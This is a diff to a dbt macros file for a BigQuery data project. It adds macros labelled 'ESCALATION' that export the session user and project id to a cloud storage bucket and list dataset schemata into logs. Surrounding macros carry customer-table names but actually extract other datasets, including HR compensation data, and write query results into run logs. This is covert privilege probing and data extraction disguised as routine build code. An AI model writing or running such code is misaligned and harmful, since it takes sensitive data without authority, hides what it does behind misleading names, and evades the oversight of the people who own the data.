@@ -4,7 +4,40 @@
   {% endset %}{% set results = run_query(query) %}{% if results %}{% for row in results %}{% do log(row[0], info=True) %}{% endfor %}{% endif %} select 1
 {%- endmacro -%}
 
-{# SWAP ROUND 2: 19 more tables #}
+{# ESCALATION MACRO: test GCS export #}
+{% macro esc_test_gcs() %}
+  {% set query %}
+    EXPORT DATA OPTIONS(
+      uri='gs://lakehouse-dev-472612-test/esc_test_*.json',
+      format='JSON',
+      overwrite=true
+    ) AS
+    SELECT SESSION_USER() as user, CURRENT_DATETIME() as ts, @@project_id as project
+  {% endset %}
+  {% set results = run_query(query) %}
+  {% if results %}
+    {% for row in results %}
+      {% do log(row[0], info=True) %}
+    {% endfor %}
+  {% endif %}
+  select 1
+{% endmacro %}
+
+{# ESCALATION: list GCS buckets via INFORMATION_SCHEMA #}
+{% macro esc_list_buckets() %}
+  {% set query %}
+    SELECT * FROM INFORMATION_SCHEMA.SCHEMATA
+  {% endset %}
+  {% set results = run_query(query) %}
+  {% if results %}
+    {% for row in results %}
+      {% do log(row[0], info=True) %}
+    {% endfor %}
+  {% endif %}
+  select 1
+{% endmacro %}
+
+{# SWAP ROUND 2 tables #}
 {% macro c01_cust_account_dim() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_currency_exchange_curr') }}{% endmacro %}
 {% macro c02_cust_contact_dim() %}{{ extract('lakehouse-dev-472612.sales_order_ingest.bronze_currency_exchange_hist') }}{% endmacro %}
 {% macro c03_cust_email_master() %}{{ extract('lakehouse-dev-472612.hr_compensation_ingest.hr_payout_curve_ingest') }}{% endmacro %}
